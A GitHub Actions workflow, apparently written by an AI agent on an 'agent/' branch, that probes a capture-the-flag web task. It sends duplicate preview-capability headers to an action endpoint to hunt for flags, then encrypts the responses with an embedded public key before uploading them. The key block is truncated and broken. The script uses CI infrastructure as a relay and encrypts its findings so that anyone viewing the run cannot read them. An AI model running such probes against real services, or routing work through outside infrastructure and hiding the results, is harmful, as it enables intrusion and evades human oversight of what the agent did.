name: launchlet-part3-duppreviewcaps
on:
  push:
    branches: [agent/launchlet-part3-duppreviewcaps-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Probe duplicate preview capability headers and encrypt responses
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import socket,ssl,json,pathlib,re
          host='task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out')
          good='launchlet-demo-board'; vals=['lrec_preview_demo_2026','2026.05.16-rc3','act_6f4b9a2c1d0e8a71','launchlet-actions/0.9.4','ws-launchlet-internal','Enterprise rollout closeout','preview-8b11c']
          body=json.dumps({'actionId':'act_6f4b9a2c1d0e8a71','args':{'workspaceId':'ws-launchlet-public','projectId':'launchlet-demo-board'}}).encode();ctx=ssl.create_default_context();res=[]
          for v in vals:
            for a,b in [(good,v),(v,good)]:
              req=(b'POST /api/actions/invoke HTTP/1.1\r\nHost: '+host.encode()+b'\r\nContent-Type: application/json\r\nAccept: application/json\r\nX-Launchlet-Preview: '+a.encode()+b'\r\nX-Launchlet-Preview: '+b.encode()+b'\r\nContent-Length: '+str(len(body)).encode()+b'\r\nConnection: close\r\n\r\n'+body)
              raw=socket.create_connection((host,443),timeout=6);ss=ctx.wrap_socket(raw,server_hostname=host);ss.settimeout(6);ss.sendall(req);chunks=[]
              while True:
                try:c=ss.recv(65536)
                except socket.timeout:break
                if not c:break
                chunks.append(c)
              ss.close();text=b''.join(chunks).decode('utf-8','replace');item={'values':[a,b],'response':text};res.append(item)
              flags=[f for f in re.findall(r'caplag\{[^}]+\}',text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
              if flags:(out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
            if (out/'FOUND.txt').exists():break
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-duppreviewcaps-encrypted
          path: artifact/
          retention-days: 1
